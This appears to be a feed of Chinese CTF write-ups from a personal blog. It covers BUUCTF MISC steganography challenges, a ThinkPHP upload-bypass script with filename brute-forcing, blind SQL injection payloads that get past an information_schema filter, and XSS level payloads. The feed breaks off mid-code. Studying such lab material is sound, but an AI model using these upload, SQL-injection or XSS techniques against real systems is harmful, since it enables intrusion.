class="built_in">range</span>(<span class="built_in">len</span>(my_bin)):</span><br><span class="line">        tmp += my_bin[i]</span><br><span class="line">        <span class="keyword">if</span> i % choose == (choose-<span class="number">1</span>) <span class="keyword">and</span> i != (<span class="built_in">len</span>(my_bin) - <span class="number">1</span>):</span><br><span class="line">            tmp += <span class="string">&#x27; &#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(tmp)</span><br><span class="line">    <span class="built_in">bin</span>=tmp</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="built_in">int</span>(b, <span class="number">2</span>) <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">bin</span>.split(<span class="string">&#x27; &#x27;</span>)]])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    my_str=<span class="string">&#x27;test&#x27;</span></span><br><span class="line">    my_bin = str_2_bin(my_str)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;字符串变二进制：<span class="subst">&#123;my_bin&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    my_bin=<span class="string">&#x27;01101011011011110110010101101011011010100011001101110011&#x27;</span></span><br><span class="line">    <span class="comment">#8位,没有空格</span></span><br><span class="line">    my_str=bin_2_str(my_bin)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;二进制变字符串：&quot;<span class="subst">&#123;my_str&#125;</span>&quot;&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="FLAG"><a href="#FLAG" class="headerlink" title="FLAG"></a>FLAG</h2><p>binwalk发现有zlib，但是解不开，没有路子<br>使用Stegsolve，LSB隐写，导出png，poc检查是一个ZIP，解压得到 1 ，是ELF，所以使用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">IDA选项 strings</span><br><span class="line">linux命令 strings <span class="number">1</span></span><br><span class="line">linux命令 grep -a <span class="string">&#x27;&#123;*&#125;&#x27;</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="假如给我三天光明"><a href="#假如给我三天光明" class="headerlink" title="假如给我三天光明"></a>假如给我三天光明</h2><p>书皮封面的盲文解密的压缩包的密码，然后打开将声音转成摩斯密码，解密即可。</p><h2 id="神秘龙卷风"><a href="#神秘龙卷风" class="headerlink" title="神秘龙卷风"></a>神秘龙卷风</h2><p>advanced 解码 brainfuck代码<br>参考：<br>许愿星<br><a href="https://www.wishingstarmoye.com/ctf/jsencode/brainfuck">https://www.wishingstarmoye.com/ctf/jsencode/brainfuck</a></p><h2 id="后门查杀"><a href="#后门查杀" class="headerlink" title="后门查杀"></a>后门查杀</h2><p>扔进审计软件，发现后门肉眼看看，或者搜pass flag之类的关键字</p><h2 id="数据包中的线索"><a href="#数据包中的线索" class="headerlink" title="数据包中的线索"></a>数据包中的线索</h2><p>过滤http信息，然后在下面这个网站解码，然后出一个图片<br><a href="https://the-x.cn/base64">Base64 在线解码、编码</a></p><h2 id="荷兰宽带数据泄露"><a href="#荷兰宽带数据泄露" class="headerlink" title="荷兰宽带数据泄露"></a>荷兰宽带数据泄露</h2><p>工具查看，然后查找username或者其他关键字<br><a href="https://routerpassview.cn.uptodown.com/windows/download">routerpassview</a></p><h2 id="来首歌吧"><a href="#来首歌吧" class="headerlink" title="来首歌吧"></a>来首歌吧</h2><p>cooleditorpro21<br>摩斯密码，注意大小写</p><h2 id="webshell后门"><a href="#webshell后门" class="headerlink" title="webshell后门"></a>webshell后门</h2><p>审计 查找pass 等关键字</p><h2 id="面具下的flag"><a href="#面具下的flag" class="headerlink" title="面具下的flag"></a>面具下的flag</h2><p>binwalk 解析，linux下7z解析vmdk，okk!+brainfunk解析<br><a href="https://www.splitbrain.org/services/ook">brainfunk+okk!解析</a></p><h2 id="九连环"><a href="#九连环" class="headerlink" title="九连环"></a>九连环</h2><p>这题认真了<br>放进winhex，查找 50 4B 01 02 ，发现很多，也就是多层加密，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">png</span><br><span class="line"></span><br><span class="line">asd/good.jpg 提示文件头损坏</span><br><span class="line">asd/qwe.zip 需要密码</span><br></pre></td></tr></table></figure><p>然后用压缩软件打开，发现有个图片但是文件头损坏，我们去winhex里面看看<br><img src="/2022/03/24/BUUCTF-MISIC-%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-01/2022-03-25-20-50-24.png"><br>由于是个多层压缩，图片打不开，我们就去图片附近看看，发现了伪加密，把标志位改成00即可<br>试了很多 如LSB、binwalk、等无果，看看WP<br>使用steghide</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">steghide info 1.jpg 文件信息，判断是否隐藏文件</span><br><span class="line">steghide extract -sf good-已合并.jpg 解压</span><br></pre></td></tr></table></figure><p>解压出一个txt，正是qwe.zip的密码，解压即可</p><h2 id="被劫持的神秘礼物"><a href="#被劫持的神秘礼物" class="headerlink" title="被劫持的神秘礼物"></a>被劫持的神秘礼物</h2><p>过滤http，看到login页面，进而跟踪流，看到用户名密码，然后MD5即可</p><h2 id="刷新过的图片"><a href="#刷新过的图片" class="headerlink" title="刷新过的图片"></a>刷新过的图片</h2><p>F5隐写<br>使用F5-steganography<br>地址 <a href="https://github.com/matthewgao/F5-steganography">https://github.com/matthewgao/F5-steganography</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java  Extract ../test/Misc.jpg</span><br><span class="line">找到output.txt，改后缀，解压即可</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> MISC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF-文件上传-[RoarCTF 2019]Simple Upload-upload()多文件上传及文件名爆破</title>
      <link href="/2022/03/23/BUUCTF-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-RoarCTF-2019-Simple-Upload-upload-%E5%A4%9A%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8F%8A%E6%96%87%E4%BB%B6%E5%90%8D%E7%88%86%E7%A0%B4/"/>
      <url>/2022/03/23/BUUCTF-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-RoarCTF-2019-Simple-Upload-upload-%E5%A4%9A%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8F%8A%E6%96%87%E4%BB%B6%E5%90%8D%E7%88%86%E7%A0%B4/</url>
      
        <content type="html"><![CDATA[<p>上来连个上串口都没有，玩个der，直接google大法找大佬的WP</p><h2 id="在哪里上传文件？"><a href="#在哪里上传文件？" class="headerlink" title="在哪里上传文件？"></a>在哪里上传文件？</h2><p>Think PHP 默认上传路径是 &#x2F;home&#x2F;index&#x2F;upload，所以我们直接访问对应路并上传文件</p><h2 id="怎么绕过？"><a href="#怎么绕过？" class="headerlink" title="怎么绕过？"></a>怎么绕过？</h2><p>hink PHP里的upload()函数在不传参的情况下是批量上传的，这里可以理解为防护机制只会检测一次，运用条件竞争，多次上传便可以绕过文件后缀的检测。</p><p>可以用一下代码感受其中的原理</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">uniqid</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">uniqid</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">uniqid</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="如何爆破？"><a href="#如何爆破？" class="headerlink" title="如何爆破？"></a>如何爆破？</h2><p>文件名方式运用了uniqid函数，它是基于微秒的当前时间来更改文件名的，所以两个同时上传生成的文件名相差不会太远。<br>所以我们就可以同时上传两个文件，然后从第一个返回的文件名来推测第二个。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">可以看到后只有后几位的差别，以及是递增的，以及是<span class="number">16</span>进制的</span><br><span class="line">这里我们想到一般情况下，原始时间是一个时间差的秒数形式，这里也类似</span><br><span class="line">&#123;<span class="string">&quot;url&quot;</span>:<span class="string">&quot;\/Public\/Uploads\/2022-03-23\/623afdf4da99e.txt&quot;</span>,<span class="string">&quot;success&quot;</span>:<span class="number">1</span>&#125;</span><br><span class="line">&#123;<span class="string">&quot;url&quot;</span>:<span class="string">&quot;\/Public\/Uploads\/2022-03-23\/623afdf520598.txt&quot;</span>,<span class="string">&quot;success&quot;</span>:<span class="number">1</span>&#125;</span><br></pre></td></tr></table></figure><h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><h3 id="法-1-用脚本上传后爆破"><a href="#法-1-用脚本上传后爆破" class="headerlink" title="法 1 - 用脚本上传后爆破"></a>法 1 - 用脚本上传后爆破</h3><p>最终脚本如下，主要参考<a href="https://www.jianshu.com/p/f45fc5ab548b">2019-12-04 [RoarCTF 2019]Simple Upload WriteUp</a>，侵删，ε&#x3D;ε&#x3D;ε&#x3D;┏(゜ロ゜;)┛</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://d2ea9782-e438-4dc5-b83e-ccf333fda94e.node4.buuoj.cn:81/index.php/home/index/upload&#x27;</span></span><br><span class="line">files=&#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;1.txt&#x27;</span>,<span class="string">&quot;aaa&quot;</span>),</span><br><span class="line">    <span class="string">&#x27;file1&#x27;</span>:(<span class="string">&#x27;q.php&#x27;</span>,<span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r=requests.post(url=url,files=files)</span><br><span class="line"><span class="comment"># print(r.text)#1 2 3</span></span><br><span class="line"><span class="comment"># r=requests.post(url=url,files=files)</span></span><br><span class="line"><span class="comment"># print(r.text)</span></span><br><span class="line">file_name=r.text.split(<span class="string">&quot;/&quot;</span>)[-<span class="number">1</span>].split(<span class="string">&quot;.&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">file_path=r.text.split(<span class="string">&quot;\\&quot;</span>)</span><br><span class="line">t1=<span class="built_in">int</span>(file_name,<span class="number">16</span>)</span><br><span class="line">j=t1</span><br><span class="line">url1=<span class="string">&#x27;http://d2ea9782-e438-4dc5-b83e-ccf333fda94e.node4.buuoj.cn:81&#x27;</span>+file_path[<span class="number">1</span>]+file_path[<span class="number">2</span>]+file_path[<span class="number">3</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(j)[<span class="number">2</span>:])</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    url2=url1+<span class="string">&quot;/%s.php&quot;</span>%(<span class="built_in">hex</span>(j)[<span class="number">2</span>:])</span><br><span class="line">    <span class="comment">#print(url2)</span></span><br><span class="line">    r=requests.get(url=url2)</span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">429</span>:</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    <span class="keyword">elif</span> r.status_code != <span class="number">404</span>:</span><br><span class="line">        <span class="built_in">print</span>(url2)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(url2,r.status_code)</span><br><span class="line">    j+=<span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="法-2-自搭网页上传后爆破"><a href="#法-2-自搭网页上传后爆破" class="headerlink" title="法 2 - 自搭网页上传后爆破"></a>法 2 - 自搭网页上传后爆破</h3><p>页面源码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>POST数据包POC<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://d2ea9782-e438-4dc5-b83e-ccf333fda94e.node4.buuoj.cn:81/index.php/home/index/upload&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file2&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>上传后可以用burp，或者脚本</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://mayi077.gitee.io/2020/04/23/RoarCTF-2019-Simple-Upload/">[RoarCTF 2019]Simple Upload</a><br><a href="https://syunaht.com/p/2343151245.html#!">刷题笔记:[RoarCTF 2019]Simple Upload</a><br><a href="https://www.jianshu.com/p/f45fc5ab548b">2019-12-04 [RoarCTF 2019]Simple Upload WriteUp</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> upload_files </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF-sql注入-[GYCTF2020]Ezsqli-过滤in/information</title>
      <link href="/2022/03/23/BUUCTF-sql%E6%B3%A8%E5%85%A5-GYCTF2020-Ezsqli-%E8%BF%87%E6%BB%A4in-information/"/>
      <url>/2022/03/23/BUUCTF-sql%E6%B3%A8%E5%85%A5-GYCTF2020-Ezsqli-%E8%BF%87%E6%BB%A4in-information/</url>
      
        <content type="html"><![CDATA[<h2 id="WAF检测"><a href="#WAF检测" class="headerlink" title="WAF检测"></a>WAF检测</h2><p>题目很直白，直接就POST传参即可，发现是整型注入，稍微试了一下几个关键字，发现有WAF，然后fuzz一下，查看哪些被过滤了有如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">handler sleep SLEEp delete having or oR BENCHMARK limit LimIt insert insERT INSERT INFORMATION xor AND ANd BY By case admin&#x27; union UNIon UNION oorr anandd HAVING IF INTO JOIN sleep infromation_schema OR ORDER ORD UNION UPDATE USING AND update delete inset DELETE floor rand() information_schema.tables LIMIT ORD order  by ORDER OUTFILE updatexml instr benchmark format bin substring ord UPDATE for BEFORE in SEPARATOR XOR CURSOR FLOOR INFILE </span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="爆数据"><a href="#爆数据" class="headerlink" title="爆数据"></a>爆数据</h2><h3 id="爆库"><a href="#爆库" class="headerlink" title="爆库"></a>爆库</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">数据库长度</span><br><span class="line"><span class="built_in">id</span>=<span class="number">1</span>&amp;&amp;(lgngth(database()))&lt;&gt;<span class="number">1</span>--</span><br><span class="line">数据库名</span><br><span class="line"><span class="built_in">id</span>=<span class="number">1</span>&amp;&amp;(<span class="built_in">ascii</span>(substr(database(),<span class="number">1</span>,<span class="number">1</span>)))&lt;&gt;<span class="number">1</span>--</span><br></pre></td></tr></table></figure><h3 id="报表"><a href="#报表" class="headerlink" title="报表"></a>报表</h3><p>由于 in 被过滤，所以就要使用mysql5.7的新特性，这里可以先爆数据库版本，但是也可以直接使用新特性，如果不可使用也就是说明不是mysql5.7及以上的版本，即新特性不可用。<br>知识补充：<br><a href="https://www.secpulse.com/archives/123956.html">过滤in,or字符的sql注入学习 </a><br><a href="https://www.anquanke.com/post/id/193512">聊一聊bypass information_schema</a><br><a href="https://blog.csdn.net/qq_45521281/article/details/106647880?spm=1001.2101.3001.6650.2&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-2.pc_relevant_aa&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-2.pc_relevant_aa&utm_relevant_index=5">Bypass information_schema与无列名注入</a><br>OK，这样我们就知道如何在没有information_shema下的爆表名<br>payload如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">该库下所有表名长度和</span><br><span class="line"><span class="built_in">id</span>=<span class="number">1</span>&amp;&amp;(select length(group_concat(table_name))<span class="keyword">from</span> sys.schema_table_statistics_with_buffer where table_schema=database())&lt;&gt;<span class="number">1</span>--</span><br><span class="line">该库下表名拼接成的字符串，用 <span class="number">7</span> 分隔</span><br><span class="line"><span class="built_in">id</span>=<span class="number">1</span>&amp;&amp;(select <span class="built_in">ascii</span>(substr(group_concat(table_name,<span class="string">&#x27;7&#x27;</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="keyword">from</span> sys.schema_table_statistics_with_buffer where table_schema=database())&gt;<span class="number">12</span>--</span><br></pre></td></tr></table></figure><h3 id="爆字段"><a href="#爆字段" class="headerlink" title="爆字段"></a>爆字段</h3><p>由于in&#x2F;information被禁，所以爆表名无门，启用无列名爆破</p><p>知识补充:<br><a href="https://blog.csdn.net/qq_45521281/article/details/106647880?spm=1001.2101.3001.6650.2&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-2.pc_relevant_aa&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-2.pc_relevant_aa&utm_relevant_index=5">Bypass information_schema与无列名注入</a><br>ok,我们知道如何使用无列名爆破了<br>payload如a下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">id</span>=<span class="number">1</span>&amp;&amp;((select * <span class="keyword">from</span> f1ag_1s_h3r3_hhhhh))&gt;(select <span class="number">1</span>,<span class="string">&quot;a&quot;</span>)</span><br></pre></td></tr></table></figure><p>解释一下这句话<br>就是<code>(select 1,&quot;a&quot;)</code>是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select <span class="number">1</span>,<span class="string">&quot;a&quot;</span>;</span><br><span class="line">+---+---+</span><br><span class="line">| <span class="number">1</span> | a |</span><br><span class="line">+---+---+</span><br><span class="line">| <span class="number">1</span> | a |</span><br><span class="line">+---+---+</span><br></pre></td></tr></table></figure><p><code>(select * from f1ag_1s_h3r3_hhhhh)</code>大概是这样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+----+----------------------+</span><br><span class="line">| id | username             |</span><br><span class="line">+----+----------------------+</span><br><span class="line">|  1 | Dumb                 |</span><br><span class="line">+----+----------------------+</span><br></pre></td></tr></table></figure><p>这里已经测试了默认列名id，我们数据只有一行，而且都id&#x3D;1，二者也就能比较第二列的数据了，两边行数不一致进行比较也会报错，除非使用limit限制，但是该题限制了limit，所以也算是出题人的精心构造吧。<br>这时候就可以逐字爆破了，但是太慢了，，，所以用二分法，但是这里有个坑，就是下面这个现象</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;b&#x27;</span>&gt;<span class="string">&#x27;a&#x27;</span>                    true</span><br><span class="line"><span class="string">&#x27;baa&#x27;</span>&gt;<span class="string">&#x27;ba&#x27;</span>                 true</span><br><span class="line"><span class="string">&#x27;bb&#x27;</span>&gt;<span class="string">&#x27;baa&#x27;</span>                 true </span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;flag&#x27;</span>&lt;<span class="string">&#x27;f&#x27;</span>                 false</span><br><span class="line"><span class="string">&#x27;flag&#x27;</span>&gt;<span class="string">&#x27;f&#x27;</span>                 true  这两行导致了二分法的失效</span><br></pre></td></tr></table></figure><p>就是mysql字符串比较的时候是弱类比较，先依次比较对应字符，然后长度。所以必须测试位置字符尾加一个高ascii值，即  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;flag&#x27;</span>&lt;<span class="string">&#x27;f&#x27;</span>                 false</span><br><span class="line"><span class="string">&#x27;flag&#x27;</span>&gt;<span class="string">&#x27;f\x7f&#x27;</span>             false  </span><br></pre></td></tr></table></figure><p>贴一下二分法的payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">大于</span><br><span class="line">payload = <span class="string">&#x27;1&amp;&amp;((select * from f1ag_1s_h3r3_hhhhh))&gt;(select 1,&quot;%s%s\x7f&quot;)&#x27;</span>%(flag,char)</span><br><span class="line"></span><br><span class="line">小于</span><br><span class="line">payload = <span class="string">&#x27;1&amp;&amp;((select * from f1ag_1s_h3r3_hhhhh))&lt;(select 1,&quot;%s%s&quot;)&#x27;</span>%(flag,char)</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在禁了ininformation情况下，使用无列名爆破，同时注意限制列数才能比较。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/qq_45521281/article/details/106647880?spm=1001.2101.3001.6650.2&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-2.pc_relevant_aa&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-2.pc_relevant_aa&utm_relevant_index=5">Bypass information_schema与无列名注入</a><br><a href="https://www.anquanke.com/post/id/193512">聊一聊bypass information_schema</a><br><a href="https://www.secpulse.com/archives/123956.html">过滤in,or字符的sql注入学习</a><br><a href="https://pythonhowto.readthedocs.io/zh_CN/latest/string.html">特殊字符的转义处理</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> sqli web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF-XSS题目</title>
      <link href="/2022/03/22/BUUCTF-XSS%E9%A2%98%E7%9B%AE/"/>
      <url>/2022/03/22/BUUCTF-XSS%E9%A2%98%E7%9B%AE/</url>
      
        <content type="html"><![CDATA[<p>记录buuctf里的XSS题目，也算实践新学的知识了</p><h1 id="第二章-web进阶-XSS闯关"><a href="#第二章-web进阶-XSS闯关" class="headerlink" title="[第二章 web进阶]XSS闯关"></a>[第二章 web进阶]XSS闯关</h1><h2 id="法-1"><a href="#法-1" class="headerlink" title="法 1"></a>法 1</h2><h3 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://2af81863-bb58-<span class="number">4032</span>-a9a1-4bdf35882c06.node4.buuoj.cn:<span class="number">81</span>/level1?username=xss&lt;script&gt;alert(<span class="number">1</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span>(location.<span class="property">search</span> == <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">    location.<span class="property">search</span> = <span class="string">&quot;?username=xss&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> username = <span class="string">&#x27;xss payload&#x27;</span>;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;ccc&#x27;</span>).<span class="property">innerHTML</span>= <span class="string">&quot;Welcome &quot;</span> + <span class="built_in">escape</span>(username);</span><br><span class="line">    </span><br><span class="line"><span class="string">``</span><span class="string">`  </span></span><br><span class="line"><span class="string">构造，闭合语句</span></span><br><span class="line"><span class="string">`</span><span class="string">``</span>python</span><br><span class="line"><span class="attr">http</span>:<span class="comment">//2af81863-bb58-4032-a9a1-4bdf35882c06.node4.buuoj.cn:81/level2?username=xss&#x27;;alert(1);//</span></span><br></pre></td></tr></table></figure><h3 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">使用url=<span class="attr">http</span>:<span class="comment">//2af81863-bb58-4032-a9a1-4bdf35882c06.node4.buuoj.cn:81/level3?username=xssaaa&#x27;;alert(1);//</span></span><br><span class="line">后端被转义</span><br><span class="line">    <span class="keyword">if</span>(location.<span class="property">search</span> == <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">    location.<span class="property">search</span> = <span class="string">&quot;?username=xss&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> username = <span class="string">&#x27;xssaaa\&#x27;;alert(1);//&#x27;</span>;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;ccc&#x27;</span>).<span class="property">innerHTML</span>= <span class="string">&quot;Welcome &quot;</span> + username;</span><br><span class="line">    </span><br></pre></td></tr></table></figure><p>构造转义的转义</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://2af81863-bb58-<span class="number">4032</span>-a9a1-4bdf35882c06.node4.buuoj.cn:<span class="number">81</span>/level3?username=xssaaa\<span class="string">&#x27;;alert(1);//</span></span><br></pre></td></tr></table></figure><h3 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 